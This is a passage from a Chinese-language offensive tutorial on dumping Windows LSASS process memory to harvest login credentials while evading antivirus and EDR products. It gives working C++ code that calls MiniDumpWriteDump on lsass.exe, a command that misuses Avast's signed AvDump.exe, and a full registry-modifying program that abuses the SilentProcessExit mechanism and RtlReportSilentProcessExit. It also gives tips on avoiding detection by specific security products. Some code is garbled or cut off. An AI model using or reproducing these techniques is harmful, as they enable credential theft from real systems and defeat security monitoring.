          WScript.StdOut.WriteLine("Something went wrong.")
        End If
    End If
但是直接出现通过rundll方式调用已经被列入是可疑行为，同样会被拦截
## 2.自定义转储
目前比较常见的首发使用`MiniDumpWriteDump`这个`Windows API`来dump内存，该API位于dbghelp.dll中的导出函数:
该函数的定义如下:
    BOOL MiniDumpWriteDump(
      HANDLE                            hProcess,
      DWORD                             ProcessId,
      HANDLE                            hFile,
      MINIDUMP_TYPE                     DumpType,
      PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
      PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
      PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
    );
因此我们需要得到`lsass.exe`的进程句柄，并且还要创建一个可写文件用于`outfile`参数的写入:
    #include 
    #include 
    #include 
    #include 
    //链接
    #pragma comment( lib, "Dbghelp.lib" )
    using namespace std;
    int main() {
        DWORD lsassPID = 0;
        HANDLE lsassHandle = NULL;
        HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        LPCWSTR processName = L"";
        //遍历lsass.exe 的PID
        if (Process32First(snapshot, &processEntry)) {
            while (_wcsicmp(processName, L"lsass.exe") != 0) {
                Process32Next(snapshot, &processEntry);
                processName = processEntry.szExeFile;
                lsassPID = processEntry.th32ProcessID;
            }
            wcout  注意该方法的一个细节就是通过获取目标进程的内存快照，从获取的快照内存中读取数据，而不是直接从目标进程中获取，更容易躲避AV/EDR检测。
## 3.其他工具
`AvDump.exe`是Avast杀毒软件中自带的一个程序，可用于转储指定进程`（lsass.exe）`内存数据，因为它带有 Avast
杀软数字签名，所以不会被反病毒检测和查杀，默认安装路径和下载地址如下：  
[https://www.pconlife.com/viewfileinfo/avdump64-exe/#fileinfoDownloadSaveInfodivGoto2](https://)
我们可以使用如下命令:
    .\avdump64.exe --pid  --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\ProgramData\lsass.dmp
> 注意需要在ps中调用，否则cmd默认是不开启seDEBUGPrivilege权限的，但是现在360会检测到avdump  
>
## 4.静默进程退出机制触发LSASS
该技术和Werfault.exe进程有关，在某个运行中的进程崩溃时，werfault.exe将会Dump崩溃进程的内存，从这一点上看，我们是有可能可以利用该行为进行目标进程内存的Dump。
在[https://www.mrwu.red/web/2000.html](https://) 这篇文章中介绍了利用蓝屏崩溃来绕过卡巴斯基`dump
lsass`进程,在win7之后，windows引入一些进程退出的相关机制
称为“静默进程退出”的机制，该机制提供了在两种情况下可以触发对被监控进行进行特殊动作的能力：  
（1）被监控进程调用 ExitProcess() 终止自身；
（2）其他进程调用 TerminateProcess() 结束被监控进程。
也就意味着当进程调用`ExitProcess() 或 TerminateProcess()`的时候，可以触发对该进程的如下几个特殊的动作:
  * 启动一个监控进程
  * 显示一个弹窗
  * 创建一个Dump文件
由于该功能默认不开启，我们需要对注册表进行操作，来开启该功能，主要的注册表项为：
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\ 注册表项下的GlobalFlag值：0x200（FLG_MONITOR_SILENT_PROCESS_EXIT）
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\\ 注册表项下的3个键值：
    1）ReportingMode（REG_DWORD），该值可设置为以下几个，具有不同功能：
      a）LAUNCH_MONITORPROCESS (0x1) – 启动监控进程；
      b）LOCAL_DUMP (0x2) – 为导致被监控进程终止的进程和被监控进程本身 二者 创建DUMP文件；
      c）NOTIFICATION (0x4) – 显示弹窗。
    2）LocalDumpFolder (REG_SZ) – DUMP文件被存放的目录，默认为%TEMP%\\Silent Process Exit；
    3）DumpType – 根据 MINIDUMP_TYPE 枚举值指定DUMP文件的类型 (Micro, Mini, Heap 或 Custom) ，完全转储目标进程内存的值为MiniDumpWithFullMemory (0x2)。
这里我们需要使用的是`MiniDumpWithFullMemory`对应的值是0x2
根据github上已有的项目代码中我们也能进行验证[https://github.com/deepinstinct/LsassSilentProcessExit](https://)
分别设置了`MiniDumpWithFullMemory`和`FLG_MONITOR_SILENT_PROCESS_EXIT`的值
实现修改注册表后我们就能够通过终止目标进程即可获得相应文件的DUMP文件，但是终止LSASS意味着系统将重启，并且我们的目的只是为了dump保存在其中的登录凭据，因此有没有什么办法能够是进程在`静默退出`而又不会实际终止进程呢？
答案是有的，我们来看这个API: **RtlReportSilentProcessExit**
API将与Windows错误报告服务（WerSvcGroup下的WerSvc）通信，告诉服务该进程正在执行静默退出。然后，WER服务将启动WerFault.exe，该文件将转储现有进程。值得注意的是，调用此API不会导致进程退出。其定义如下：
    NTSTATUS （NTAPI * RtlReportSilentProcessExit ）（
            _In_      HANDLE      ProcessHandle，
            _In_      NTSTATUS    ExitStatus 
           ）;
但是在MSDN中并没有查询到该API的任何解释，原来该函数是`Ntdll.dll`的导出函数而MSDN是没有关于`Ntdll`中API的任何解释的:
当我们调用此API不会导致Lsass进程退出,这可以让我们在LSASS进程上执行DUMP动作而不导致LSASS的终止从而实现我们的目的
原文作者使用两种方式，一种是直接调用`RtlReportSilentProcessExit`，一种是远程在LSASS中创建线程执行`RtlReportSilentProcessExit`  
这两种方法都能够成功dump内存，这里我们使用第一种方式通过`RtlReportSilentProcessExit`来使得`lsass`进程出于静默退出状态
贴出`main.cpp`:
    #include "windows.h"
    #include "tlhelp32.h"
    #include "stdio.h"
    #include "shlwapi.h"
    #pragma comment(lib, "shlwapi.lib")
    #define IFEO_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
    #define SILENT_PROCESS_EXIT_REG_KEY L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"
    #define LOCAL_DUMP 0x2
    #define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
    #define DUMP_FOLDER L"C:\\temp"
    #define MiniDumpWithFullMemory 0x2
    typedef NTSTATUS(NTAPI * fRtlReportSilentProcessExit)(
        HANDLE processHandle,
        NTSTATUS ExitStatus
        );
    BOOL EnableDebugPriv() {
        HANDLE hToken = NULL;
        LUID luid;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
            printf(" - 获取当前进程Token失败 %#X\n", GetLastError());
            return FALSE;
        }
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            printf(" - Lookup SE_DEBUG_NAME失败 %#X\n", GetLastError());
            return FALSE;
        }
        TOKEN_PRIVILEGES tokenPriv;
        tokenPriv.PrivilegeCount = 1;
        tokenPriv.Privileges[0].Luid = luid;
        tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL)) {
            printf(" - AdjustTokenPrivileges 失败: %#X\n", GetLastError());
            return FALSE;
        }
        return TRUE;
    }
    BOOL setRelatedRegs(PCWCHAR procName) {
        HKEY hkResSubIFEO = NULL;
        HKEY hkResSubSPE = NULL;
        DWORD globalFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;
        DWORD reportingMode = MiniDumpWithFullMemory;
        DWORD dumpType = LOCAL_DUMP, retstatus = -1;
        BOOL ret = FALSE;
        PWCHAR subkeyIFEO = (PWCHAR)malloc(lstrlenW(IFEO_REG_KEY)*2 + lstrlenW(procName)*2 + 5);
        wsprintf(subkeyIFEO, L"%ws%ws", IFEO_REG_KEY, procName);
        PWCHAR subkeySPE = (PWCHAR)malloc(lstrlenW(SILENT_PROCESS_EXIT_REG_KEY)*2 + lstrlenW(procName)*2 + 5);
        wsprintf(subkeySPE, L"%ws%ws", SILENT_PROCESS_EXIT_REG_KEY, procName);
        printf(" - [DEBUGPRINT] Image_File_Execution_Options: %ws\n", subkeyIFEO);
        printf(" - [DEBUGPRINT] SilentProcessExit: %ws\n", subkeySPE);
        do {
            // 设置 Image File Execution Options\ 下GlobalFlag键值为0x200
            if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, subkeyIFEO, &hkResSubIFEO))) {
                printf(" - 打开注册表项 Image_File_Execution_Options 失败: %#X\n", GetLastError());
                break;
            }
            if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubIFEO, L"GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlag, sizeof(globalFlag)))) {
                printf(" - 设置注册表键 GlobalFlag 键值失败: %#X\n", GetLastError());
                break;
            }
            // 设置 SilentProcessExit\ 下 ReporingMode/LocalDumpFolder/DumpType 三个值
            if (ERROR_SUCCESS != (retstatus = RegCreateKey(HKEY_LOCAL_MACHINE, subkeySPE, &hkResSubSPE))) {
                printf(" - 打开注册表项 SilentProcessExit 失败: %#X\n", GetLastError());
                break;
            }
            if (ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingMode, sizeof(reportingMode)))
                || ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"LocalDumpFolder", 0, REG_SZ, (const BYTE*)DUMP_FOLDER, lstrlenW(DUMP_FOLDER)*2))
                || ERROR_SUCCESS != (retstatus = RegSetValueEx(hkResSubSPE, L"DumpType", 0, REG_DWORD, (const BYTE*)&dumpType, sizeof(dumpType)))) {
                printf(" - 设置注册表键 reportingMode|LocalDumpFolder|DumpType 键值失败: %#X\n", GetLastError());